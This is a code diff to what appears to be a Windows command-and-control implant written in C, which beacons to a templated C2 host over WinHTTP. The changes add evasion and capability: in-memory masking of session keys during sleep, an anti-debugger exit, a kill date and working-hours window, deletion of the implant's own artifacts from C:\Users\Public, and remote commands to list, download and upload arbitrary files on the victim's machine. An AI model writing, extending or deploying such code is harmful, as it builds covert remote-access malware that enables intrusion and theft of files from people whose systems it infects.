@@ -34,8 +34,18 @@
 #define BEACON_JITTER {{BEACON_JITTER}}
 #define USE_HTTPS {{USE_HTTPS}}
 #define SERVER_PUB "{{SERVER_X25519_PUB}}"
+#ifndef KILL_DATE
+#define KILL_DATE 0
+#endif
+#ifndef WORK_START
+#define WORK_START 0
+#endif
+#ifndef WORK_END
+#define WORK_END 24
+#endif
 
 static char g_agent_id[64] = {0};
+static unsigned char g_session[32], g_hs[32], g_eph[32];
 
 static const char b64_table[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
 
@@ -202,26 +212,62 @@ static char *aes_gcm_open_raw(const unsigned char key[32], const unsigned char *
     return pt;
 }
 
-static void sleep_mask(int ms) {
-    unsigned char buf[16];
+static void xor_mem(unsigned char *p, size_t n, const unsigned char *key, size_t klen) {
+    size_t i;
+    for (i = 0; i < n; i++) p[i] ^= key[i % klen];
+}
+
+static void stealth_sleep_ms(int ms) {
     unsigned char key[32];
-    memcpy(buf, "sleep-mask-v1!!", 16);
     if (!BCRYPT_SUCCESS(BCryptGenRandom(NULL, key, 32, BCRYPT_USE_SYSTEM_PREFERRED_RNG))) {
         Sleep(ms > 0 ? ms : 1);
         return;
     }
-    size_t slen = 0;
-    unsigned char *sealed = aes_gcm_raw(key, buf, 16, &slen);
-    memset(buf, 0, sizeof(buf));
+    xor_mem((unsigned char *)g_agent_id, sizeof(g_agent_id), key, 32);
+    xor_mem(g_session, sizeof(g_session), key, 32);
+    xor_mem(g_hs, sizeof(g_hs), key, 32);
+    xor_mem(g_eph, sizeof(g_eph), key, 32);
     Sleep(ms > 0 ? ms : 1);
-    if (sealed) {
-        char *pt = aes_gcm_open_raw(key, sealed, slen);
-        if (pt) free(pt);
-        free(sealed);
+    xor_mem(g_eph, sizeof(g_eph), key, 32);
+    xor_mem(g_hs, sizeof(g_hs), key, 32);
+    xor_mem(g_session, sizeof(g_session), key, 32);
+    xor_mem((unsigned char *)g_agent_id, sizeof(g_agent_id), key, 32);
+    memset(key, 0, sizeof(key));
+}
+
+static void sleep_mask(int ms) {
+    stealth_sleep_ms(ms);
+}
+
+static void wait_window(void) {
+    for (;;) {
+        SYSTEMTIME st;
+        int today;
+        if (IsDebuggerPresent()) ExitProcess(0);
+        GetSystemTime(&st);
+        today = st.wYear * 10000 + st.wMonth * 100 + st.wDay;
+        if (KILL_DATE > 0 && today > KILL_DATE) ExitProcess(0);
+        if (WORK_END <= WORK_START || WORK_END >= 24 || (st.wHour >= WORK_START && st.wHour < WORK_END)) return;
+        Sleep(60000);
     }
 }
 
-static unsigned char g_session[32], g_hs[32], g_eph[32];
+static void wipe_public_artifacts(void) {
+    const char *globs[] = {"C:\\Users\\Public\\*.hd", "C:\\Users\\Public\\*frame.txt", "C:\\Users\\Public\\*host.txt", NULL};
+    int i;
+    for (i = 0; globs[i]; i++) {
+        WIN32_FIND_DATAA fd;
+        HANDLE h = FindFirstFileA(globs[i], &fd);
+        if (h == INVALID_HANDLE_VALUE) continue;
+        do {
+            char path[MAX_PATH];
+            snprintf(path, sizeof(path), "C:\\Users\\Public\\%s", fd.cFileName);
+            DeleteFileA(path);
+        } while (FindNextFileA(h, &fd));
+        FindClose(h);
+    }
+}
+
 static int g_have_session = 0, g_have_eph = 0;
 
 static char *wire_encrypt(const char *data, size_t len) {
@@ -415,7 +461,7 @@ static char* http_post(const wchar_t *path, const char *data) {
                                       WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                                       WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
     if (!hSession) return NULL;
-    WinHttpSetTimeouts(hSession, 5000, 5000, 5000, 5000);
+    WinHttpSetTimeouts(hSession, 15000, 15000, 15000, 20000);
 
     HINTERNET hConnect = WinHttpConnect(hSession, C2_HOST, C2_PORT, 0);
     if (!hConnect) { WinHttpCloseHandle(hSession); return NULL; }
@@ -463,6 +509,67 @@ static int g_beacon_sleep = BEACON_SLEEP;
 
 static char* execute_command(const char *cmd) {
     const char *run = cmd;
+    if (strncmp(cmd, "__fs:", 5) == 0) {
+        const char *op = cmd + 5;
+        if (strncmp(op, "ls:", 3) == 0 || strncmp(op, "ls ", 3) == 0) {
+            const char *path = op + 3;
+            char spec[MAX_PATH];
+            WIN32_FIND_DATAA fd;
+            HANDLE h;
+            char *out;
+            size_t cap = 4096, n = 0;
+            if (!path[0]) path = ".";
+            snprintf(spec, sizeof(spec), "%s\\*", path);
+            h = FindFirstFileA(spec, &fd);
+            if (h == INVALID_HANDLE_VALUE) return _strdup("Error: cannot list");
+            out = (char *)malloc(cap);
+            if (!out) { FindClose(h); return _strdup("Error: oom"); }
+            out[0] = 0;
+            do {
+                char line[MAX_PATH + 48];
+                int m;
+                if (!strcmp(fd.cFileName, ".") || !strcmp(fd.cFileName, "..")) continue;
+                m = snprintf(line, sizeof(line), "%s %lu %s\n",
+                    (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) ? "d" : "f",
+                    (unsigned long)fd.nFileSizeLow, fd.cFileName);
+                if (n + (size_t)m + 1 > cap) {
+                    cap *= 2;
+                    out = (char *)realloc(out, cap);
+                }
+                memcpy(out + n, line, (size_t)m);
+                n += (size_t)m;
+                out[n] = 0;
+            } while (FindNextFileA(h, &fd));
+            FindClose(h);
+            return n ? out : _strdup("(empty)");
+        }
+        if (strncmp(op, "get:", 4) == 0) {
+            char wrapped[MAX_PATH + 16];
+            snprintf(wrapped, sizeof(wrapped), "__px:download:%s", op + 4);
+            return execute_command(wrapped);
+        }
+        if (strncmp(op, "put:", 4) == 0) {
+            const char *tab = strchr(op + 4, '\t');
+            char path[MAX_PATH];
+            size_t plen, rawlen;
+            unsigned char *raw;
+            FILE *fh;
+            if (!tab) return _strdup("Error: put needs path and data");
+            plen = (size_t)(tab - (op + 4));
+            if (plen >= sizeof(path)) plen = sizeof(path) - 1;
+            memcpy(path, op + 4, plen);
+            path[plen] = 0;
+            raw = base64_decode(tab + 1, strlen(tab + 1), &rawlen);
+            if (!raw) return _strdup("Error: bad upload");
+            fh = fopen(path, "wb");
+            if (!fh) { free(raw); return _strdup("Error: cannot write"); }
+            fwrite(raw, 1, rawlen, fh);
+            fclose(fh);
+            free(raw);
+            return _strdup("uploaded");
+        }
+        return _strdup("Error: unknown file op");
+    }
     if (strncmp(cmd, "__px:", 5) == 0) {
         const char *op = cmd + 5;
         if (strcmp(op, "ps") == 0) {
@@ -648,10 +755,19 @@ static void beacon_loop(void) {
                     char *cmd_end = strchr(cmd_start, '"');
                     if (!cmd_end) break;
 
-                    char command[1024] = {0};
-                    size_t cmdlen = cmd_end - cmd_start;
-                    if (cmdlen >= sizeof(command)) cmdlen = sizeof(command) - 1;
-                    memcpy(command, cmd_start, cmdlen);
+                    size_t cmdlen = (size_t)(cmd_end - cmd_start);
+                    char *command;
+                    size_t j = 0, i;
+                    if (cmdlen > 512 * 1024) cmdlen = 512 * 1024;
+                    command = (char *)calloc(1, cmdlen + 1);
+                    if (!command) break;
+                    for (i = 0; i < cmdlen; i++) {
+                        if (cmd_start[i] == '\\' && i + 1 < cmdlen && (cmd_start[i + 1] == '\\' || cmd_start[i + 1] == '"')) {
+                            command[j++] = cmd_start[++i];
+                            continue;
+                        }
+                        command[j++] = cmd_start[i];
+                    }
 
                     if (strcmp(command, "__kill") == 0) {
                         free(dec);
@@ -661,6 +777,7 @@ static void beacon_loop(void) {
                     if (strncmp(command, "__set_interval:", 15) == 0) {
                         g_beacon_sleep = atoi(command + 15);
                         if (g_beacon_sleep < 1) g_beacon_sleep = 1;
+                        free(command);
                         cmd_start = strstr(cmd_end, "\"command\":\"");
                         continue;
                     }
@@ -672,6 +789,7 @@ static void beacon_loop(void) {
                     snprintf(result_json, strlen(escaped) + strlen(command) + 256,
                         "{\"type\":\"response\",\"output\":\"%s\",\"command\":\"%s\"}",
                         escaped, command);
+                    free(command);
                     free(escaped);
                     free(output);
 
@@ -700,7 +818,8 @@ static void beacon_loop(void) {
             sleep_ms = sleep_ms - jitter + (rand() % (jitter * 2 + 1));
         }
         if (sleep_ms < 1000) sleep_ms = 1000;
-        sleep_mask(sleep_ms);
+        wait_window();
+        stealth_sleep_ms(sleep_ms);
     }
 }
 
@@ -708,6 +827,8 @@ int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow) {
     int hd_take_host(void);
     int hd_host_main(void);
     if (hd_take_host()) return hd_host_main();
+    wait_window();
+    wipe_public_artifacts();
     srand((unsigned int)time(NULL) ^ GetCurrentProcessId());
 
     SYSTEM_INFO si;
